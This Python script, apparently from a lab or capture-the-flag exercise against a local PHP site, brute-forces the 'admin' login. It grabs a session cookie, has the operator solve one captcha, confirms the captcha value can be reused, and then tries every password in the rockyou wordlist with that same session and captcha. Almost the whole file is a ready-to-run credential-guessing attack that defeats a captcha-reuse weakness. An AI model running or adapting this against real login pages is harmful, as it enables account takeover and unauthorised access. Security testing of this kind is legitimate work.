import requests

session = requests.Session()

response = session.get("http://localhost:8080/login.php")

phpsessid = response.cookies["PHPSESSID"]
print(f"[+] Got PHPSESSID: {phpsessid}")

captcha_image = session.get("http://localhost:8080/captcha.php")

with open("captcha.jpg", "wb") as captcha_file:
    captcha_file.write(captcha_image.content)

captcha = input("What is the captcha value stored in captcha.jpg: ")

# Attempt login to ensure valid cookie
response = requests.post(
    "http://localhost:8080/login.php",
    cookies={"PHPSESSID": phpsessid},
    data={"username": "josh", "password": "josh", "captcha": captcha},
)

if "username or password" not in response.text:
    print("[!] Captcha value was wrong")
    exit()

print("[+] Captcha value valid, brute-forcing password...")

with open("/wordlists/rockyou.txt") as wordlist:
    for password in wordlist.readlines():
        response = requests.post(
            "http://localhost:8080/login.php",
            cookies={"PHPSESSID": phpsessid},
            data={"username": "admin", "password": password, "captcha": captcha},
        )

        if "incorrect" not in response.text:
            print(response.text)
            print("[+] Found valid password:", password)
            exit()

        print("[-] Invalid password:", password)
